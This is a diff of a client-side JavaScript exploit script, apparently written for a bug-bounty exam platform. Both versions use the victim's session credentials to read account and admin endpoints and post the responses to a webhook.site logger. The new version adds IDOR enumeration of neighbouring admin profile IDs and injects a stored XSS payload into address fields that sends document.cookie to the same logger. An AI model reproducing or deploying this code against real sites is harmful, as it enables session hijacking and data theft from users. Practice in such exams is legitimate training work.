@@ -1,35 +1,44 @@
 <script>
-    const logger = "https://webhook.site/e0ddef86-5a1f-472e-a42c-9612ab165efe";
+    const logger = "https://webhook.site/68d67ea7-f29d-470c-a202-019f330a7bc6";
+    const apiBase = "https://api-bugbounty-exam.hashacademy.co/api";
 
-    async function findSecret() {
-        // Try the 'Me' endpoint - often contains API keys or secrets
-        try {
-            const res = await fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/me", {
-                method: "GET",
-                credentials: "include"
-            });
-            const data = await res.json();
-            
-            // Leak it to your webhook
-            fetch(logger, {
-                method: "POST",
-                body: JSON.stringify({ source: "AUTH_ME", data: data })
-            });
-        } catch (e) {}
+    async function startExploit() {
+        // --- VECTOR 1: IDOR (Neighboring Profiles) ---
+        // We take the Admin ID and check the IDs immediately before and after it
+        const adminIdPrefix = "69d28e841cda77b519a9550"; 
+        const variants = ["d", "f", "0", "1"]; 
 
-        // Try a 'Settings' endpoint just in case
+        for (let char of variants) {
+            try {
+                const res = await fetch(`${apiBase}/auth/profile/${adminIdPrefix}${char}`, { credentials: "include" });
+                const data = await res.json();
+                fetch(logger, { method: "POST", body: JSON.stringify({ type: "IDOR_LEAK", id: char, data }) });
+            } catch (e) {}
+        }
+
+        // --- VECTOR 2: Stealthy XSS (Address Injection) ---
+        // Address fields are often less protected than Names
+        const xssPayload = `<img src=x onerror="fetch('${logger}?cookie='+document.cookie)">`;
+        
         try {
-            const res2 = await fetch("https://api-bugbounty-exam.hashacademy.co/api/admin/settings", {
-                method: "GET",
-                credentials: "include"
-            });
-            const data2 = await res2.json();
-            fetch(logger, {
-                method: "POST",
-                body: JSON.stringify({ source: "ADMIN_SETTINGS", data: data2 })
+            await fetch(`${apiBase}/auth/profile`, {
+                method: "PATCH",
+                headers: { "Content-Type": "application/json" },
+                credentials: "include",
+                body: JSON.stringify({
+                    "fullName": "Sajaa_Researcher",
+                    "phoneNumber": "2025550101",
+                    "address": {
+                        "street": xssPayload, // Injection Point 1
+                        "city": "New York",
+                        "state": xssPayload, // Injection Point 2
+                        "zipCode": "10001",
+                        "country": "USA"
+                    }
+                })
             });
         } catch (e) {}
     }
 
-    findSecret();
+    startExploit();
 </script>
